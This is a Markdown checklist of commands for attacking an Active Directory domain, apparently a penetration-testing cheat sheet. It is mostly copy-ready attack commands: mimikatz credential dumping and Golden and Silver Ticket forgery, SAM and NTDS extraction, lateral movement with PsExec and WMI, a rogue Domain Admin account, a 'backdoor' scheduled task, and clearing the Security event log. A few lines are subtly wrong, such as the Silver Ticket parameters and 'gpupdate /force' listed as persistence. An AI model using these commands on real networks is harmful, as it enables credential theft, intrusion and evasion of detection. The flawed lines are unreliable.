# Active Directory Attack Checklist

##  Reconnaissance
- [ ] Enumerate domain information: `whoami /all`, `nltest /domain_trusts`
- [ ] List domain controllers: `nltest /dclist:<domain>`
- [ ] Find users and groups: `net user /domain`, `net group /domain`
- [ ] Enumerate shares: `net share`, `net view /domain`
- [ ] Check for open SMB ports: `nmap -p 139,445 --script=smb-enum-shares <target>`
- [ ] Extract DNS records: `nslookup -type=all <domain>`

##  Credential Gathering
- [ ] Dump credentials from LSASS: `mimikatz sekurlsa::logonpasswords`
- [ ] Check for saved credentials: `cmdkey /list`
- [ ] Extract credentials from SAM database: `reg save HKLM\SAM sam.save`
- [ ] Look for plaintext passwords in scripts, files, and GPP: `findstr /S /I "password" *.*`

##  Privilege Escalation
- [ ] Check local admin privileges: `whoami /priv`
- [ ] Identify misconfigured services: `accesschk.exe /accepteula -uwcqv "Everyone" *`
- [ ] Exploit Unquoted Service Paths: `wmic service get name,pathname | findstr /i "C:\Program Files"`
- [ ] Abuse AlwaysInstallElevated: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
- [ ] Exploit writable system paths: `icacls <path>`

##  Lateral Movement
- [ ] Find accessible systems: `net view`, `wmic /node:<target> process list`
- [ ] Use PsExec: `psexec.exe \<target> -u <user> -p <password> cmd.exe`
- [ ] Use WMI for remote execution: `wmic /node:<target> process call create "cmd.exe"`
- [ ] Use RDP if enabled: `mstsc /v:<target>`

##  Kerberos Attacks
- [ ] Enumerate SPNs for Kerberoasting: `GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER>:<PASS>`
- [ ] Perform Pass-the-Ticket: `mimikatz "kerberos::list"`
- [ ] Perform Golden Ticket attack: `mimikatz "kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /krbtgt:<NTLM>"`
- [ ] Perform Silver Ticket attack: `mimikatz "kerberos::silver /service:cifs /target:<TARGET> /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM>"`

##  Domain Persistence
- [ ] Add rogue admin users: `net user <user> /add && net group "Domain Admins" <user> /add`
- [ ] Create a scheduled task: `schtasks /create /tn backdoor /tr "cmd.exe /c <command>" /sc minute /mo 1`
- [ ] Modify GPO for persistence: `gpupdate /force`
- [ ] Dump Active Directory database: `ntdsutil "ac i ntds" "ifm" create full C:\dump`

##  Exfiltration & Cleanup
- [ ] Compress and exfiltrate sensitive data: `tar -czvf archive.tar.gz <folder>`
- [ ] Clear event logs: `wevtutil cl Security`
- [ ] Remove created users and scheduled tasks: `net user <user> /delete`, `schtasks /delete /tn <task>`
- [ ] Remove backdoors: `reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v <value>`

---

##  Resources
- [MITRE ATT&CK - Active Directory Techniques](https://attack.mitre.org/techniques/enterprise/)
- [Harmj0y's Blog on AD Attacks](https://www.harmj0y.net/)
- [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)
- [Red Team Field Manual (RTFM)](https://leanpub.com/rtfm)
- [Mimikatz Official Repository](https://github.com/gentilkiwi/mimikatz)


